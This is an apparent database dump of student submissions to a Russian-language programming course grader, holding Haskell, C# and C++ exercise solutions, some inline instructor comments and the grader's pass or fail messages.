(2420, 57, '63706456', '2012-10-20 21:52:50', 2, '  --- Что-то у вас не совсем правильно.\r\n  --- Вот такой пример не проходит: canMakeScheme [13,2,10] 30\r\n  --- Выдает True, но такой схемы, конечно, нет = самое большое, что можно собрать, это 25\r\n  --- Попробуйте исправить, скажем до среды включительно. (А я сейчас добавлю такой тест)\r\nimport Data.List\r\n\r\ndata Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving (Show,Eq,Ord)\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y\r\ndEq x y = abs(x - y) < 1e-3\r\n\r\nflatten1 [] = []\r\nflatten1 (x:xs) = (foldr (x f->(x:).f) id x) (flatten1 xs)\r\n\r\napproxSum = sum . takeWhile ((> 0.000001) . abs)\r\n\r\nz = approxSum $ map (x->1/(x*x)) [1..]\r\n\r\ncanMakeScheme xs n = any (dEq n) $ map computeRes $ flatten1 $ map (x -> exactSchemes xs x) [1..(length xs)]\r\n\r\nsplit n = let n2 = (div n 2) in zip [1..n2] [n-1,n-2..(n-n2)]\r\nmerge s1 s2 = [Paral s1 s2,Conseq s1 s2]\r\n\r\nexactSchemes xs 1 = map Res xs\r\nexactSchemes xs n = [sch | (a,b) <- (split n), s1 <- exactSchemes xs a, s2 <- exactSchemes xs b, sch <- merge s1 s2]', '<br/>Тесты успешно пройдены!'),
(2421, 73, '5772638', '2012-10-20 21:55:29', 1, 'fibs = 1 : 1 : [ a+b | (a,b) <- zip fibs (tail fibs) ]', '<br/>Тесты успешно пройдены!'),
(2422, 58, '63706456', '2012-10-20 21:57:01', 0, 'import Data.List\r\n\r\ndata Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving (Show,Eq,Ord)\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y\r\ndEq x y = abs(x - y) < 1e-3\r\n\r\nflatten1 [] = []\r\nflatten1 (x:xs) = (foldr (x f->(x:).f) id x) (flatten1 xs)\r\n\r\napproxSum = sum . takeWhile ((> 0.000001) . abs)\r\n\r\nz = approxSum $ map (x->1/(x*x)) [1..]\r\n\r\ncanMakeScheme xs n = any (dEq n) $ map computeRes $ flatten1 $ map (x -> exactSchemes xs x) [1..(length xs)]\r\n\r\nsplit n = let n2 = (div n 2) in zip [1..n2] [n-1,n-2..(n-n2)]\r\nmerge s1 s2 = [Paral s1 s2,Conseq s1 s2]\r\n\r\nexactSchemes xs 1 = map Res xs\r\nexactSchemes xs n = [sch | (a,b) <- (split n), s1 <- exactSchemes xs a, s2 <- exactSchemes xs b, sch <- merge s1 s2]\r\n--не уверен, но сработало за минуту-две на canMakeScheme [1..9] 45', 'Не удалось вычислить выражение "canMakeScheme [13,2,30,3,7] 6", проверьте правильность синтаксиса'),
(2423, 58, '63706456', '2012-10-20 22:00:16', 2, 'import Data.List\r\n\r\ndata Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving (Show,Eq,Ord)\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y\r\ndEq x y = abs(x - y) < 1e-3\r\n\r\nflatten1 [] = []\r\nflatten1 (x:xs) = (foldr (x f->(x:).f) id x) (flatten1 xs)\r\n\r\napproxSum = sum . takeWhile ((> 0.000001) . abs)\r\n\r\nz = approxSum $ map (x->1/(x*x)) [1..]\r\n\r\ncanMakeScheme xs n = any (dEq n) $ map computeRes $ flatten1 $ map (x -> exactSchemes xs x) [1..(length xs)]\r\n\r\nsplit n = let n2 = (div n 2) in zip [1..n2] [n-1,n-2..(n-n2)]\r\nmerge s1 s2 = [Paral s1 s2,Conseq s1 s2]\r\n\r\nexactSchemes xs 1 = map Res xs\r\nexactSchemes xs n = [sch | (a,b) <- (split n), s1 <- exactSchemes xs a, s2 <- exactSchemes xs b, sch <- merge s1 s2]\r\n--странно, отрабатывает вроде как нормально\r\n--canMakeScheme [13,2,30,3,7] 6\r\n--True\r\n   --- Эту задачу я тестирую вручную, потому что тут надо заставлять машину работать минут по 15, неохота делать \r\n   --- это на сервере. Но ваш подход, мне кажется для 9 точно не годиться. Мы можете сами проверить,\r\n   ---  вызываете canMakeScheme [1,2,3,4,5,6,7,8,9] 100\r\n   --- Ответ должен быть отрицательный, и программа должна получить его не больше чем за 15 мин', '<br/>Тесты успешно пройдены!'),
(2424, 67, '472848', '2012-10-20 22:05:48', 1, '#include <algorithm>\r\nusing namespace std;\r\n\r\nvoid zeroDigits(int *a, int size, int n)\r\n{\r\n  int divide = 1;\r\n  for (int i = 0; i < n; divide *= 10, ++i);\r\n  transform(a, a + size, a, [divide](int i) {return (i / divide) * divide;});\r\n}\r\n\r\nvoid main()\r\n{\r\n  int a[] = { 1, 234, 12455, 342, 22 };\r\n  zeroDigits(a, 5, 2);\r\n  for (int i = 0; i < 5; ++i) printf("%d ", a[i]);\r\n}', '<br/>Тесты успешно пройдены!'),
(2425, 56, 'artyushov', '2012-10-20 22:31:01', 1, 'allLists n 0 = [[]]\r\nallLists n k = [ i:j | i <- [1..n], j <- allLists n (k-1)]\r\n', '<br/>Тесты успешно пройдены!'),
(2426, 56, '1029771', '2012-10-20 22:56:08', 1, 'allLists n 1 = [[1..n]]\r\nallLists n 2 = [ [x,y] | x <- [1..a], y <- [1..a]] where a=n\r\n\r\nallLists n m = [ x:y | x <- [1..a], y <-allLists g h ]  where a=n; g = n; h = m-1\r\n\r\n--- извините пожалуйста. Там просто долго дебажил программу и забыл заменить тестовую константу...', '<br/>Тесты успешно пройдены!'),
(2427, 68, '1029771', '2012-10-20 23:06:09', 1, ' static int[] zeroDigits(int[] a, int step) \r\n        {\r\n            int st = 1;\r\n            for(int i = 0; i < step; i++){st*=10; }\r\n            var b = a.Select(n => (n / st) * st);\r\n            return b.ToArray();\r\n        }', '<br/>Тесты успешно пройдены!'),
(2428, 65, '5772638', '2012-10-20 23:34:23', 1, 'cantor = (1,1):[ (x,y)|(1,b)<- cantor,x<-[1..(1+b)],y<-[1..(1+b)], x+y==(b+2)]\r\n  --- ОК, но на самом деле очень сложно, тут можно без рекурсивного определения cantor черед себя.\r\n  --- Ведь фактически (1,b)<- cantor просто присваивает b все целые числа от 1. Те можно просто b = [1..]', '<br/>Тесты успешно пройдены!'),
(2429, 77, '517309', '2012-10-21 05:55:04', 3, 'sqrt2 = [1,4,1,4,2,1,3,5,6,2,3,7,3,0,9,5,0,4,8,8]', '<br/>Тесты успешно пройдены!'),
(2430, 78, '517309', '2012-10-21 05:55:47', 3, 'pascal = [[1], [1,2,1], [1,3,3,1], [1,4,6,4,1], [1,5,10,10,5,1]]', '<br/>Тесты успешно пройдены!'),
(2431, 69, '82873297', '2012-10-21 06:33:09', 1, 'bigSin x = head (filter (>x) (map sin [1..]))\r\n', '<br/>Тесты успешно пройдены!'),
(2432, 70, '82873297', '2012-10-21 06:33:35', 1, 'myFilter p xs = foldr (x resl -> if (p x) then (x:resl) else resl) [] xs\r\n', '<br/>Тесты успешно пройдены!'),
(2433, 71, '82873297', '2012-10-21 06:33:55', 1, 'approxSum xs = sum(takeWhile (x->(abs x)>0.000001) xs)\r\n\r\n\r\n\r\nz = approxSum [1/(i*i) | i<-[1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2434, 72, '82873297', '2012-10-21 06:34:20', 1, 'weekendExpences xs = weekendExpences1 xs 1\r\n\r\n\r\n\r\nweekendExpences1 [] _ = 0\r\n\r\nweekendExpences1 (x:xs) d | ((mod (d-6) 7 == 0)||(mod d 7 == 0)) = x+weekendExpences1 xs (d+1)\r\n\r\n                          | otherwise = weekendExpences1 xs (d+1)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2435, 73, '82873297', '2012-10-21 06:34:40', 1, 'fibs = 1:1:(zipWith (+) fibs (tail fibs)) \r\n', '<br/>Тесты успешно пройдены!'),
(2436, 74, '82873297', '2012-10-21 06:35:03', 2, '  --- Нет, это не тот вариант foldTree. который имелся в виду в условии.\r\n  --- Имелся в виду другой вариант, где у f три параметра\r\ndata Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nfoldTree f e Empty = e\r\n\r\nfoldTree f e  (Node x lt rt)= f (f x (foldTree f  e lt)) (foldTree f  e rt)\r\n\r\n\r\n\r\nsumPos t = foldTree (x res -> if x>0 then res+x else res) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2437, 75, '82873297', '2012-10-21 06:37:38', 1, 'foldr f e []     =  e\r\nfoldr f e (x:xs) =  f x (foldr f e xs)\r\n\r\nfoldr :: (a->b->b)->b->[a]->b\r\n\r\n1) a1->a2->a3->a4\r\n2) f x (foldr f e xs) => a1=(a5->a6->a7)\r\n   (x:xs) => a3 = [a8]\r\n   \r\n           (a5->a6->a7)->a2->[a8]->a4\r\n\r\na4 и a7 - резултат работы f => a4 есть a7\r\nfoldr f e [] = e => a2 - тип результата foldr и второго аргумента f => a2=a6=a4=a7=b\r\n\r\nтип элементов (x:xs) - тип первого аргумента f => a5=a8=a\r\n\r\nfoldr :: (a->b->b)->b->[a]->b\r\n \r\n', '<br/>Тесты успешно пройдены!'),
(2438, 76, '82873297', '2012-10-21 06:37:54', 1, 'data Circle = Circle Double\r\n\r\n\r\n\r\ndata Rect = Rect Double Double\r\n\r\n\r\n\r\nclass Shape a where \r\n\r\n      perimeter :: a->Double\r\n\r\n\r\n\r\ninstance Shape Circle where\r\n\r\n         perimeter (Circle r)=2*pi*r\r\n\r\n\r\n\r\ninstance Shape Rect where\r\n\r\n         perimeter (Rect x y)=2*x+2*y\r\n', '<br/>Тесты успешно пройдены!'),
(2439, 70, '44060', '2012-10-21 07:34:52', 1, 'myFilter s xs = foldr (a b -> if (s a) then (a : b) else b ) [] xs', '<br/>Тесты успешно пройдены!'),
(2440, 59, '532002', '2012-10-21 07:39:12', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace Task13_1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static int[] nonZeroLastDigits(int[] xs)\r\n\r\n        {\r\n\r\n            return xs.Select(x => x % 10).Where(x => x != 0).ToArray();\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 4, 6, 75, 230, 59 };\r\n\r\n            int[] b = nonZeroLastDigits(a);\r\n\r\n            for (int i = 0; i < b.Length; i++) Console.WriteLine(b[i]);\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2441, 67, '44060', '2012-10-21 08:04:19', 1, 'int *zeroDigits ( int a[], int size, int n )\r\n{\r\n	int x = 1;\r\n	int *y = new int[n];\r\n	for ( int i = 0; i < n; i++ ) {x =x * 10;}\r\n	transform (a,size + a, y, [x] (int i) { return (i - i%x);});\r\n	return y;\r\n}', '<br/>Тесты успешно пройдены!'),
(2442, 57, '63706456', '2012-10-21 08:49:22', 1, 'import Data.List\r\n\r\n\r\n--для 9 за 15 мин. не отработает\r\ndata Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving (Show,Eq,Ord)\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y\r\n\r\n--как кстати можно избавиться от повторного паттерн-матчинга? \r\n   --- А я не очень понял, что вы в данном случае имеете в виду?\r\nschemeToListFunc (Res x) = (x:)\r\nschemeToListFunc (Paral x y) = (schemeToListFunc x).(schemeToListFunc y)\r\nschemeToListFunc (Conseq x y) = (schemeToListFunc x).(schemeToListFunc y)\r\nschemeToList sch = (schemeToListFunc sch) []\r\n\r\ndEq x y = abs(x - y) < 1e-3\r\n\r\nflatten1 [] = []\r\nflatten1 (x:xs) = (foldr (x f->(x:).f) id x) (flatten1 xs)\r\n\r\ncontainsAll ys xs = cAll (sort ys) (sort xs)\r\ncAll [] _ = True\r\ncAll _ [] = False\r\ncAll (y:ys) (x:xs) 	| y == x = cAll ys xs\r\n			| otherwise = cAll (y:ys) xs\r\n\r\ncanMakeScheme xs n = 	any ((x,y) -> 	(y `dEq` n) && \r\n					(containsAll (schemeToList x) xs)) $  \r\n			map (x-> (x, computeRes x)) $ \r\n			flatten1 $ \r\n			map (x -> exactSchemes xs x) [1..(length xs)]\r\n\r\nsplit n = let n2 = (div n 2) in zip [1..n2] [n-1,n-2..(n-n2)]\r\n\r\nmerge s1 s2 = [Paral s1 s2,Conseq s1 s2]\r\n\r\nexactSchemes xs 1 = map Res xs\r\nexactSchemes xs n = [sch | (a,b) <- (split n), s1 <- exactSchemes xs a, s2 <- exactSchemes (xs) b, sch <- merge s1 s2]', '<br/>Тесты успешно пройдены!'),
(2443, 59, '383483', '2012-10-21 08:58:48', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _13_1\r\n{\r\n    class Program\r\n    {\r\n        static int[] nonZeroLastDigits(int[] a)\r\n        {\r\n            return a.Select(x => (x % 10)).Where(x => x != 0).ToArray();\r\n        }\r\n        static void Main()\r\n        {\r\n            int[] inp = { 354, 20, 9, 3195, 1, 12, 0, 89, 90, 13, 445 };\r\n            int[] inter = nonZeroLastDigits(inp);\r\n            for (int i = 0; i < inter.Length; i++)\r\n                Console.Write("{0} ",inter[i]);\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2444, 66, '5772638', '2012-10-21 09:24:08', 1, 'set b 1=[[x]|x<-[1..b]]\r\nset b n=[x:xs|x<-[1..b],xs<-set b (n-1)]\r\n\r\ngeneralizedCantor n = [ xs| b<- [n..],xs<-set b n, sum xs==b]', '<br/>Тесты успешно пройдены!'),
(2445, 60, '44060', '2012-10-21 09:50:43', 1, 'void nonZeroLastDigits(int a[], int n)\r\n{\r\n	int *y = new int[n];\r\n	transform(a, a+n, y, [] (int i) {return (i % 10);});\r\n	int *rezult = remove_if(y, y + n, [] (int i) {return i == 0; });\r\n	int i = 0;\r\n	while (y[i] != rezult[0])\r\n	{printf("%5d", y[i++])}\r\n\r\n}', '<br/>Тесты успешно пройдены!'),
(2446, 57, '44060', '2012-10-21 10:19:24', 0, 'remove1 (x:xs) k = if x ==k\r\n	then xs\r\n	else x : remove1 xs k\r\n\r\nremove2 xs [] = xs\r\nremove2 xs (k:ks) = remove2 (remove1 xs k) ks\r\n\r\nlengthSet [] = [[]]\r\nlengthSet (x:xs) = \r\n    let\r\n      ys = lengthSet xs\r\n      ts = map (qs -> (x:qs)) ys\r\n    in ts ++ ys\r\n\r\nfunction xs len = filter (ys -> length ys <= len) (lengthSet xs)\r\n\r\nremove3 [] = []\r\nremove3 (x:xs) = x : (remove3 (filter (/=x) xs))\r\n\r\nmix rs1 rs2 = remove3(foldr ([x,y] rezult -> x:y:rezult) [] [[r1 + r2, r1*r2/(r1 + r2)] | r1 <- rs1, r2 <- rs2])\r\n\r\nfunc [] = []\r\nfunc [r] = [r]\r\nfunc xs =\r\n    let\r\n      f ys rezult =\r\n        let\r\n          zs = remove2 xs ys\r\n        in remove3 (mix (func ys) (func zs) ++ rezult)\r\n    in remove3 (foldr f [] (function xs (length xs `div` 2)))\r\n\r\ng xs x = foldr (||) False (map (==x) xs)\r\n\r\ncanMakeScheme rs r = g (func rs) r', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2447, 59, '44060', '2012-10-21 10:35:03', 1, 'static int[] nonZeroLastDigits(int[] a) {\r\n	return a.Select(x => x%10).Where(x => x!=0).ToArray();}\r\n   --- Засчитано, но вообще в задачах на C# и С++ желательно выкладывать cs файл (или cpp файл) целиком (или хотя бы примеры вызова)', '<br/>Тесты успешно пройдены!'),
(2448, 57, '44060', '2012-10-21 11:16:27', 1, 'remove1 (x:xs) k = if x ==k\r\n	then xs\r\n	else x : remove1 xs k\r\n\r\nremove2 xs [] = xs\r\nremove2 xs (k:ks) = remove2 (remove1 xs k) ks\r\n\r\nlengthSet [] = [[]]\r\nlengthSet (x:xs) = \r\n    let\r\n      ys = lengthSet xs\r\n      ts = map (qs -> (x:qs)) ys\r\n    in ts ++ ys\r\n\r\nfunction xs len = filter (ys -> length ys <= len) (lengthSet xs)\r\n\r\nremove3 [] = []\r\nremove3 (x:xs) = x : (remove3 (filter (/=x) xs))\r\n\r\nmix rs1 rs2 = remove3(foldr ([x1,x2,x3,x4] rezult -> x1:x2:x3:x4:rezult) [] [[r1, r2, r1 + r2, r1*r2/(r1 + r2)] | r1 <- rs1, r2 <- rs2])\r\n\r\nfunc [] = []\r\nfunc [r] = [r]\r\nfunc xs =\r\n    let\r\n      f ys rezult =\r\n        let\r\n          zs = remove2 xs ys\r\n        in remove3 ((mix (func ys) (func zs)) ++ rezult)\r\n    in remove3 (foldr f [] (function xs (length xs `div` 2)))\r\n\r\ng xs x = foldr (||) False (map (==x) xs)\r\n\r\ncanMakeScheme rs r = g (func rs) r', '<br/>Тесты успешно пройдены!'),
(2449, 68, '44060', '2012-10-21 11:23:25', 0, ' static int[] zeroDigits(int[] a, int n) {\r\n            int x = 1;\r\n            for (int i = 0; i < n; i++) {x =x * 10;}\r\n            return a.Select(y => ( y - y % module)).ToArray();\r\n        }', '<br/>Тесты успешно пройдены!'),
(2450, 56, '4169333', '2012-10-21 11:50:38', 1, 'allLists n 0= [[]]\r\nallLists n k= [(x:xs)| x<- [1..n],xs<- allLists n (k-1)]', '<br/>Тесты успешно пройдены!'),
(2451, 68, '44060', '2012-10-21 12:08:49', 1, 'static int[] zeroDigits(int[] a, int n) {\r\n            int x = 1;\r\n            for (int i = 0; i < n; i++) {x =x * 10;}\r\n    --- Или лучше x*=10;\r\n            return a.Select(y => ( y - y%x)).ToArray();\r\n        }', '<br/>Тесты успешно пройдены!'),
(2452, 71, '472848', '2012-10-21 12:23:14', 0, 'approxSum (x:xs) = if (x < 0.000001) then 0 else x + approxSum xs\r\nz = approxSum [1/(i*i)|i<-[1..]]', 'Хитрый тест номер 1 не пройден :(<br/>Подсказка: Последовательность может содержать и отрицательные числа'),
(2453, 71, '472848', '2012-10-21 12:25:05', 1, 'approxSum (x:xs) = if (abs x < 0.000001) then 0 else x + approxSum xs\r\nz = approxSum [1/(i*i)|i<-[1..]]', '<br/>Тесты успешно пройдены!'),
(2454, 72, '472848', '2012-10-21 12:41:14', 1, 'weekendExpences li = f 1 li\r\n\r\nf i [] = 0\r\nf i (x:li) = if (mod i 7 == 6 || mod i 7 == 0) then x + f (i+1) li else f (i + 1) li ', '<br/>Тесты успешно пройдены!'),
(2455, 73, '12206137', '2012-10-21 12:48:20', 1, 'fibs = zipWith (+) (1:fibs) (0:0:fibs)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2456, 57, '472848', '2012-10-21 13:18:18', 0, 'import Data.List\r\n\r\npermutations [] = [[]]\r\npermutations xs  = [x:ps | x <- xs, ps <- permutations (xs\\[x])]\r\n\r\ncanMakeScheme li m = f (permutations li) m\r\n\r\nf [] _ = False\r\nf (li:sli) m = g li m || f sli m\r\n\r\ng [x, y] m = if (x + y == m || x * y / (x + y) == m) then True else False\r\ng (x:(y:xs)) m = g ((x + y):xs) m || g ((x * y / (x + y)):xs) m', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2457, 57, '472848', '2012-10-21 13:23:39', 1, 'permutations [] = [[]]\r\npermutations xs  = [x:ps | x <- xs, ps <- permutations (xs[x])]\r\n\r\ncanMakeScheme li m = f (permutations li) m\r\n\r\nf [] _ = False\r\nf (li:sli) m = g li m || f sli m\r\n\r\ng [x, y] m = if (x + y == m || x * y / (x + y) == m) then True else False\r\ng (x:(y:xs)) m = g ((x + y):xs) m || g ((x * y / (x + y)):xs) m', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2458, 77, '2118411', '2012-10-21 14:00:22', 0, 'power10 = 1:map(*10) power10\r\nsqrt2 = []++(mysqrt2 0 0)\r\nmysqrt2 y n =\r\n        let\r\n                yt = y*10\r\n                newt = head (filter (	->(yt+t)*(yt+t) <= 2*(power10!!(2*n))) [9,8..0])\r\n        in newt:(mysqrt2 (yt+newt) (n+1))\r\n', '<br/>Тесты успешно пройдены!'),
(2459, 78, '2118411', '2012-10-21 14:01:15', 0, 'pascal = [1]:map (xs->1:(zipWith (+) xs (tail xs))++[1]) pascal\r\n\r\n-- [1],[1,1],[1,2,1]...', 'Выражение имеет неправильное значение: take 5 pascal'),
(2460, 78, '2118411', '2012-10-21 14:03:07', 1, '  -- oops, сейчас исправлю\r\npascal3 = [1,2,1]:map (xs->1:(zipWith (+) xs (tail xs))++[1]) pascal3\r\npascal = [1]:pascal3\r\n\r\n\r\n-- Как в условии: [1],[1,2,1]...', '<br/>Тесты успешно пройдены!'),
(2461, 77, '2118411', '2012-10-21 14:09:41', 1, 'powers = 2:map(*100) powers\r\nsqrt2 = mysqrt2 0 0\r\nmysqrt2 y n =\r\n        let\r\n                yt = y*10\r\n                newt = head (filter (	->(yt+t)*(yt+t) <= powers!!n) [9,8..0])\r\n        in newt:(mysqrt2 (yt+newt) (n+1))\r\n', '<br/>Тесты успешно пройдены!'),
(2462, 56, '9539826', '2012-10-21 14:44:51', 1, 'allLists n k = allLists1 ([[]]) n k\r\nallLists1 answ n 0 = answ\r\nallLists1 answ n k = allLists1 ([x++[a]|x<-answ,a<-[1..n]]) (n) (k-1)', '<br/>Тесты успешно пройдены!'),
(2463, 56, '83813', '2012-10-21 15:01:16', 1, 'allLists n 0 = [[]]\r\n\r\nallLists n k = [x:xs | x <- [1..n], xs <- allLists n (k - 1)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2464, 56, '1730564', '2012-10-21 15:07:24', 1, 'allLists n 1 = [[i] | i <- [1..n]]\r\nallLists n k = [(i : list) | i <- [1..n], list  <- allLists n (k - 1)]\r\n', '<br/>Тесты успешно пройдены!'),
(2465, 77, 'Deutsche', '2012-10-21 15:25:57', 1, 'sqrt2 = sqrtlist 0 0 -- первый параметр - текущее количество цифр, второй - текущее число\r\nsqrtlist n y = let \r\n		bignum = 2*10^(n*2)\r\n		s = [x | x<-[0..9], ((y*10+x)^2)<=bignum, bignum<((y*10+x+1)^2)]\r\n	       in ((s!!0):sqrtlist (n+1) (y*10+(s!!0)))', '<br/>Тесты успешно пройдены!'),
(2466, 78, '318210', '2012-10-21 15:42:21', 1, 'pascal =  iterate (x -> zipWith (+) ([0] ++ x) (x ++ [0])) [1]  \r\n    -- ok это у меня тест был неправильный', 'Выражение имеет неправильное значение: take 5 pascal'),
(2467, 59, '9539826', '2012-10-21 16:15:32', 2, '   --- Нет, это не по условию. Еще надо\r\n   --- Создать массив их последних цифр, причем не просто, а с помощью Where\r\n   --- Вынести это все в отдельную функцию\r\n   --- Допишите, пожалуйста.\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace nonZeroLastDigits\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            int[] mas = { 1, 2, 3, 4, 5, 6, 10, 11, 34, 68, 90, 110 };\r\n            int[] answ = mas.Where(x => (x % 10) > 0).ToArray();\r\n            foreach (int i in answ)\r\n                Console.Write(i%10+" ");\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2468, 78, 'Deutsche', '2012-10-21 16:27:15', 1, 'pascal = [1]:map (s -> zipWith (+) (s++[0]) (0:s)) pascal\r\n     -- ok это у меня тест был неправильный', 'Выражение имеет неправильное значение: take 5 pascal'),
(2469, 77, '3431532', '2012-10-21 16:28:29', 2, 'sqrt2 = [ (truncate ((sqrt 2)*10^n)) `mod` 10 | n<-[0..] ]\r\n   --- Нет, так не получиться, потому что sqrt 2 - это приближенное значение, в котором точных знаков может 10\r\n   --- или 12, я точно не помню. А вам надо бесконечное количество точных знаков.', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(2470, 77, '318210', '2012-10-21 16:37:09', 2, 'newsqrt a = (truncate (10 * a)) : newsqrt ((10 * a) - realToFrac( truncate(10 * a)))\r\nsqrt2 = newsqrt (sqrt(2) / 10)\r\n\r\n--тут решение без знания вычей! А как с ними?\r\n   --- Но ответ неправильный, вы же видите..\r\n   --- Нет, так не получиться, потому что sqrt 2 - это приближенное значение, в котором точных знаков может 10\r\n   --- или 12, я точно не помню. А вам надо бесконечное количество точных знаков.\r\n   --- Те представьте себе, что вы не знаете цифр sqrt 2 и у вас нет компьютера, можете только считать на бумаге.\r\n   --- Как бы вы это сделали?\r\n   ', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(2471, 78, '3431532', '2012-10-21 16:39:09', 1, 'pascal = iterate (line -> zipWith (+) ([0] ++ line) (line ++ [0])) [1]\r\n  -- ok это у меня тест был неправильный', 'Выражение имеет неправильное значение: take 5 pascal'),
(2472, 65, '5656962', '2012-10-21 18:02:06', 1, 'cantor = zip (list1 1) (list2 1)\r\n\r\n\r\n\r\nlist1 i = [1..i]++list1(i+1)\r\n\r\nlist2 i = (rev[1..i] [])++list2(i+1)\r\n\r\n\r\n\r\nrev [] res = res\r\n\r\nrev (x:xs) res = rev xs (x:res)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2473, 66, '5656962', '2012-10-21 18:04:58', 1, 'generalizedCantor n = foldr(i res -> lfilter (allLists i n) i ++ res) [] [1..]\r\n\r\n\r\n\r\nallLists n 0 = [[]]\r\n\r\nallLists n k = [(x:xs) | x <- [1..n], xs <- allLists n (k-1)]\r\n\r\n\r\n\r\nlfilter lists n = [list | list <- lists, n `elem` list]\r\n', '<br/>Тесты успешно пройдены!'),
(2474, 57, 'erwert', '2012-10-21 18:05:37', 2, '  --- Да, что-то не так у вас.. Вот еще пример попроще, который не проходит\r\n  --- canMakeScheme [13,7,20] 10\r\n  --- Если хотите, можете попобовать исправить, скажем до среды выключительно\r\ntn [] = [[]]\r\ntn (h:hs) = tn hs ++ (map (h:) $ tn hs)\r\n\r\npr [] = [[]]\r\npr hs  = [h:p | h <- hs, p <- pr [t | t <-hs, t /= h]]\r\n\r\nfold r [] n = r\r\nfold r (h:hs) n \r\n	| mod n 2 == 1 = fold (r*h/(r+h)) hs o\r\n	| otherwise = r + fold h hs o\r\n	where o = if n == 1 then 0 else div n 2\r\n\r\ncanMakeScheme l m = go False (tail $ tn l) m\r\n\r\newe True a b = True\r\newe bl [] b = False\r\newe bl ((x:hh):hs) m = ewe (elem m [fold x hh t | t <- [0..2^n -1]]) hs m \r\n	where n = length hh\r\n\r\ngo True h m = True\r\ngo pt [] m = False\r\ngo pt (hh:hs) m = go (ewe False [[hh !! x | x <- t] | t <- pr [0..n]] m) hs m\r\n	where n = length hh - 1', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2475, 57, 'hasp', '2012-10-21 18:09:59', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sz = length l in\r\n	let ps = take (sz-1) (tail (zip (inits l) (tails l))) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf `div` (rg+lf)):ac ) [] right):acc) [] left))) [] ps\r\n\r\nresistors [] _ = False			\r\nresistors l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2476, 57, 'hasp', '2012-10-21 18:10:38', 0, 'import Data.List\r\n\r\ncanGet [] = [0]\r\ncanGet (x:[]) = [x]\r\ncanGet l@(x:xs) =\r\n	let sz = length l in\r\n	let ps = take (sz-1) (tail (zip (inits l) (tails l))) in \r\n	foldl (acc (hd, tl) -> \r\n		let left = canGet hd in let right = canGet tl in \r\n			concat (left:right:(foldl (acc lf -> (foldl (ac rg -> (rg + lf):(rg*lf `div` (rg+lf)):ac ) [] right):acc) [] left))) [] ps\r\n\r\ncanMakeScheme  [] _ = False			\r\ncanMakeScheme  l@(x:xs) r = case (find (==r) (canGet l)) of Just _ -> True ; Nothing -> False', 'Выражение имеет неправильное значение: canMakeScheme [4,4,5] 1'),
